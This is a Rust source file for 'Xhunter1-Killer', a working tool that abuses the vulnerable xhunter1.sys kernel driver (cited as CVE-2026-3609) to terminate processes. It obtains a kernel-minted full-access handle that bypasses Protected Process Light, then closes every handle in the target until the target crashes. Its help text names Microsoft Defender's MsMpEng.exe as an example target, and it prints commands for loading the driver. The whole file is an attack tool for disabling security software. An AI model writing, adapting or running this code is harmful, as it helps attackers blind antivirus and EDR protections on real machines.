//! Xhunter1-Killer — process termination via `xhunter1.sys` cmd 800 handle stomp.
//!
//! Two-tier handle acquisition, cmd 800 only as the kill primitive:
//!   1. `OpenProcess(PROCESS_ALL_ACCESS)` — works against non-PPL targets.
//!   2. Fallback: cmd 785 — mints a kernel-mode `PROCESS_ALL_ACCESS` handle
//!      that defeats PPL (the original CVE-2026-3609 primitive).
//!
//! Once a handle is held, every entry in the target's handle table is closed
//! via cmd 800. The driver clears `ProtectFromClose` (via
//! `ObSetHandleAttributes(KernelMode)`) before each `ZwClose`, so even
//! protected handles go down. Once a critical kernel object is yanked, the
//! target faults on its next I/O and exits.
//!
//! Assumes the driver is already loaded. Default device path is `\\.\xhunter`;
//! override with `-d` if your install registered a different SCM service name.

#![allow(non_snake_case)]

use std::ffi::c_void;

use clap::Parser;
use windows::core::{s, PCWSTR};
use windows::Win32::Foundation::{CloseHandle, GENERIC_WRITE, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, WriteFile, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_MODE, OPEN_EXISTING,
};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};

// Bare RtlAdjustPrivilege binding — avoids dragging in advapi32 token APIs.
#[link(name = "ntdll")]
unsafe extern "system" {
    fn RtlAdjustPrivilege(privilege: u32, enable: u8, current_thread: u8, was_enabled: *mut u8) -> i32;
}
const SE_DEBUG_PRIVILEGE: u32 = 20;

fn enable_se_debug() -> bool {
    let mut was = 0u8;
    unsafe { RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, 1, 0, &mut was) == 0 }
}

// ─── Protocol constants (legacy xhunter1.sys, pre-2023.09) ─────────────────

const REQ_SIZE:        usize = 0x270;     // 624 bytes
const RESP_SIZE:       usize = 762;
const XHUNTER_MAGIC:   u32   = 0x345821AB;

const CMD_OPEN_PROCESS: u32 = 785;        // mints kernel-mode PROCESS_ALL_ACCESS handle
const CMD_CLOSE_HANDLE: u32 = 800;        // ObSetHandleAttributes(KernelMode) + ZwClose

const PROCESS_ALL_ACCESS_F: u32 = 0x1FFFFF;

// Request layout
const REQ_OFF_LENGTH:   usize = 0x00;
const REQ_OFF_MAGIC:    usize = 0x04;
const REQ_OFF_XOR_KEY:  usize = 0x08;
const REQ_OFF_OPCODE:   usize = 0x0C;
const REQ_OFF_RESP_PTR: usize = 0x10;
const REQ_OFF_ARG0:     usize = 0x18;     // cmd 785: pid    | cmd 800: target proc handle
const REQ_OFF_ARG1:     usize = 0x1C;     // cmd 785: access |
const REQ_OFF_ARG2:     usize = 0x20;     //                 | cmd 800: handle to close

// Response layout
const RESP_OFF_STATUS:  usize = 0x0C;
const RESP_OFF_HANDLE:  usize = 0x10;

// SystemExtendedHandleInformation
const SYS_EXT_HANDLE_INFO:   u32 = 0x40;
const STATUS_INFO_LEN_MISMATCH: u32 = 0xC000_0004;

// ─── CLI ────────────────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(
    name = "Xhunter1-Killer",
    about = "Process killer via xhunter1.sys cmd 800 handle stomp (legacy CVE-2026-3609 driver)",
)]
struct Cli {
    /// Target process name (e.g. notepad.exe, MsMpEng.exe).
    #[arg(short = 'n', long = "name")]
    name: String,

    /// Driver device path. Default is the legacy hardcoded name.
    #[arg(short = 'd', long = "device", default_value = "\\\\.\\xhunter")]
    device: String,
}

// ─── Driver protocol helpers ────────────────────────────────────────────────

fn open_device(path: &str) -> Result<HANDLE, String> {
    let w: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
    unsafe {
        CreateFileW(
            PCWSTR(w.as_ptr()),
            GENERIC_WRITE.0,
            FILE_SHARE_MODE(0),
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
    }.map_err(|e| format!("CreateFileW({path}): {e}"))
}

/// Send one xhunter1 command, return (NTSTATUS, full response buffer).
fn send_cmd<F: FnOnce(&mut [u8])>(
    device: HANDLE,
    opcode: u32,
    fill: F,
) -> Result<(i32, Vec<u8>), String> {
    let mut req = [0u8; REQ_SIZE];
    let mut resp = vec![0u8; RESP_SIZE];

    unsafe {
        let p = req.as_mut_ptr();
        *(p.add(REQ_OFF_LENGTH)   as *mut u32) = REQ_SIZE as u32;
        *(p.add(REQ_OFF_MAGIC)    as *mut u32) = XHUNTER_MAGIC;
        *(p.add(REQ_OFF_XOR_KEY)  as *mut u32) = 0x4141_4141;
        *(p.add(REQ_OFF_OPCODE)   as *mut u32) = opcode;
        *(p.add(REQ_OFF_RESP_PTR) as *mut u64) = resp.as_mut_ptr() as u64;
    }
    fill(&mut req);

    let mut written = 0u32;
    unsafe {
        WriteFile(device, Some(&req), Some(&mut written), None)
            .map_err(|e| format!("WriteFile (opcode {opcode}): {e}"))?;
    }

    let status = unsafe { *(resp.as_ptr().add(RESP_OFF_STATUS) as *const i32) };
    Ok((status, resp))
}

/// Cmd 785 — kernel-minted PROCESS_ALL_ACCESS handle on `pid`. Defeats PPL.
fn cmd_785(device: HANDLE, pid: u32) -> Result<HANDLE, String> {
    let (status, resp) = send_cmd(device, CMD_OPEN_PROCESS, |req| unsafe {
        *(req.as_mut_ptr().add(REQ_OFF_ARG0) as *mut u32) = pid;
        *(req.as_mut_ptr().add(REQ_OFF_ARG1) as *mut u32) = PROCESS_ALL_ACCESS_F;
    })?;
    if status < 0 {
        return Err(format!("cmd 785 NTSTATUS 0x{:08X}", status as u32));
    }
    let raw = unsafe { *(resp.as_ptr().add(RESP_OFF_HANDLE) as *const u64) };
    if raw == 0 { return Err("cmd 785 returned NULL handle".into()); }
    Ok(HANDLE(raw as *mut c_void))
}

/// Cmd 800 — close `victim` inside `target_handle`'s handle table, attached
/// via KeStackAttachProcess. The driver strips ProtectFromClose first.
fn cmd_800(device: HANDLE, target_handle: HANDLE, victim: u64) -> Result<(), String> {
    let (status, _) = send_cmd(device, CMD_CLOSE_HANDLE, |req| unsafe {
        *(req.as_mut_ptr().add(REQ_OFF_ARG0) as *mut u64) = target_handle.0 as u64;
        *(req.as_mut_ptr().add(REQ_OFF_ARG2) as *mut u64) = victim;
    })?;
    if status < 0 {
        return Err(format!("cmd 800 NTSTATUS 0x{:08X}", status as u32));
    }
    Ok(())
}

// ─── Helpers ────────────────────────────────────────────────────────────────

fn find_pid(image_name: &str) -> Result<u32, String> {
    let target = image_name.to_ascii_lowercase();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| format!("CreateToolhelp32Snapshot: {e}"))?;
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        let mut found: Option<u32> = None;
        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let end = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
                let name = String::from_utf16_lossy(&entry.szExeFile[..end]).to_ascii_lowercase();
                if name == target {
                    found = Some(entry.th32ProcessID);
                    break;
                }
                if Process32NextW(snap, &mut entry).is_err() { break; }
            }
        }
        let _ = CloseHandle(snap);
        found.ok_or_else(|| format!("process '{image_name}' not found"))
    }
}

/// Enumerate every handle owned by `target_pid` via
/// `NtQuerySystemInformation(SystemExtendedHandleInformation)`.
fn enumerate_process_handles(target_pid: u32) -> Result<Vec<u64>, String> {
    type NtQsiFn = unsafe extern "system" fn(u32, *mut c_void, u32, *mut u32) -> i32;
    unsafe {
        let ntdll = GetModuleHandleA(s!("ntdll.dll"))
            .map_err(|e| format!("GetModuleHandleA(ntdll): {e}"))?;
        let p = GetProcAddress(ntdll, s!("NtQuerySystemInformation"))
            .ok_or("NtQuerySystemInformation not exported")?;
        let nt_qsi: NtQsiFn = std::mem::transmute(p);

        let mut size: u32 = 0x10_0000;
        let mut buf: Vec<u8> = vec![0u8; size as usize];
        loop {
            let mut needed = 0u32;
            let status = nt_qsi(SYS_EXT_HANDLE_INFO, buf.as_mut_ptr() as _, size, &mut needed);
            if status == 0 { break; }
            if status as u32 == STATUS_INFO_LEN_MISMATCH {
                size = needed.saturating_add(0x1_0000).max(size.saturating_mul(2));
                buf = vec![0u8; size as usize];
                continue;
            }
            return Err(format!("NtQuerySystemInformation: 0x{:08X}", status as u32));
        }

        // SYSTEM_HANDLE_INFORMATION_EX:
        //   +0x00  NumberOfHandles  (usize)
        //   +0x08  Reserved         (usize)
        //   +0x10  Handles[]        (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, 40B)
        // Entry:
        //   +0x00  Object           (PVOID)
        //   +0x08  UniqueProcessId  (ULONG_PTR)
        //   +0x10  HandleValue      (ULONG_PTR)
        const ENTRY_SIZE: usize = 40;
        let count = usize::from_le_bytes(buf[..8].try_into().unwrap());
        let mut out = Vec::new();
        for i in 0..count {
            let off = 0x10 + i * ENTRY_SIZE;
            if off + ENTRY_SIZE > buf.len() { break; }
            let pid = usize::from_le_bytes(buf[off + 8..off + 16].try_into().unwrap()) as u32;
            if pid != target_pid { continue; }
            let handle = u64::from_le_bytes(buf[off + 16..off + 24].try_into().unwrap());
            out.push(handle);
        }
        Ok(out)
    }
}

// ─── Main ───────────────────────────────────────────────────────────────────

fn main() {
    let cli = Cli::parse();

    println!();
    println!("  [~] Xhunter1-Killer — cmd 800 handle stomp via xhunter1.sys");
    println!();

    if enable_se_debug() {
        println!("[+] SeDebugPrivilege ...... enabled");
    } else {
        println!("[!] SeDebugPrivilege not granted — tier-1 OpenProcess will likely be denied on PPL targets (run elevated)");
    }

    let target_pid = match find_pid(&cli.name) {
        Ok(p) => p,
        Err(e) => { eprintln!("[-] {e}"); std::process::exit(1); }
    };
    println!("[+] Target PID ............ {target_pid} ({})", cli.name);

    let device_path = if cli.device.starts_with("\\\\.\\") || cli.device.starts_with("\\\\?\\") {
        cli.device.clone()
    } else {
        format!("\\\\.\\{}", cli.device)
    };
    let device = match open_device(&device_path) {
        Ok(h) => h,
        Err(e) => {
            eprintln!("[-] {e}");
            eprintln!("    Driver must be loaded. Try:");
            eprintln!("        sc create xhunter type= kernel binPath= C:\\path\\to\\xhunter1.sys");
            eprintln!("        sc start  xhunter");
            std::process::exit(1);
        }
    };
    println!("[+] Driver opened ......... {}", device_path);

    // Enumerate the target's handle table once — same list whether the
    // process handle we feed cmd 800 came from OpenProcess or cmd 785.
    let handles = match enumerate_process_handles(target_pid) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("[-] enumerate_process_handles: {e}");
            unsafe { let _ = CloseHandle(device); }
            std::process::exit(1);
        }
    };
    if handles.is_empty() {
        eprintln!("[-] No handles enumerated for PID {target_pid}");
        std::process::exit(1);
    }
    println!("[+] Target has {} open handles", handles.len());

    // Tier 1 — minimum privileges via OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION).
    // For PPL/EDR targets the OS or registered Ob callbacks may refuse even this.
    // For non-PPL targets the syscall succeeds; we then probe cmd 800 with the
    // tier-1 handle. Any failure (OpenProcess denied OR cmd 800 refused) escalates
    // to tier 2 — cmd 785, which mints a kernel-mode PROCESS_ALL_ACCESS handle
    // and defeats PPL.
    let probe = handles[0];
    let escalate_reason: Option<String>;
    let mut tier1_handle: Option<HANDLE> = None;

    match unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, target_pid) } {
        Ok(h) => {
            println!("[+] Tier 1 handle ......... 0x{:X} (OpenProcess PROCESS_QUERY_LIMITED_INFORMATION)", h.0 as usize);
            match cmd_800(device, h, probe) {
                Ok(()) => {
                    println!("[+] Probe stomp accepted with tier-1 handle.");
                    tier1_handle = Some(h);
                    escalate_reason = None;
                }
                Err(e) => {
                    println!("[!] Probe stomp refused with tier-1 handle: {e}");
                    unsafe { let _ = CloseHandle(h); }
                    escalate_reason = Some(format!("cmd 800 refused tier-1 handle: {e}"));
                }
            }
        }
        Err(e) => {
            println!("[!] OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION) denied: {e}");
            escalate_reason = Some(format!("OpenProcess refused: {e}"));
        }
    }

    let (working_handle, source, mut ok, mut fail) = match (tier1_handle, escalate_reason) {
        (Some(h), None) => (h, "tier 1 (minimum privileges)", 1usize, 0usize),
        (_, Some(_)) => {
            println!("[*] Tier 2: cmd 785 — minting PPL-bypassing PROCESS_ALL_ACCESS handle...");
            match cmd_785(device, target_pid) {
                Ok(h2) => {
                    println!("[+] Tier 2 handle ......... 0x{:X} (cmd 785 kernel-minted PROCESS_ALL_ACCESS)", h2.0 as usize);
                    match cmd_800(device, h2, probe) {
                        Ok(()) => (h2, "tier 2 (cmd 785)", 1usize, 0usize),
                        Err(e2) => {
                            eprintln!("[-] cmd 800 refused tier-2 handle: {e2}");
                            unsafe {
                                let _ = CloseHandle(h2);
                                let _ = CloseHandle(device);
                            }
                            std::process::exit(1);
                        }
                    }
                }
                Err(e2) => {
                    eprintln!("[-] cmd 785 failed: {e2}");
                    unsafe { let _ = CloseHandle(device); }
                    std::process::exit(1);
                }
            }
        }
        _ => unreachable!(),
    };

    // Stomp the rest of the handle table.
    for &h in &handles[1..] {
        match cmd_800(device, working_handle, h) {
            Ok(()) => ok += 1,
            Err(_) => fail += 1,
        }
    }
    println!("[+] Handle stomp ({source}): closed {ok}, refused {fail} (of {})", handles.len());
    let target_handle = working_handle;

    // Quick verification: re-resolve the PID.
    std::thread::sleep(std::time::Duration::from_millis(400));
    let alive = find_pid(&cli.name).is_ok();
    if alive {
        eprintln!("[!] PID may still be alive — re-run if needed.");
    } else {
        println!("[+] Verified: {} no longer present in process list.", cli.name);
    }

    unsafe {
        let _ = CloseHandle(target_handle);
        let _ = CloseHandle(device);
    }
}
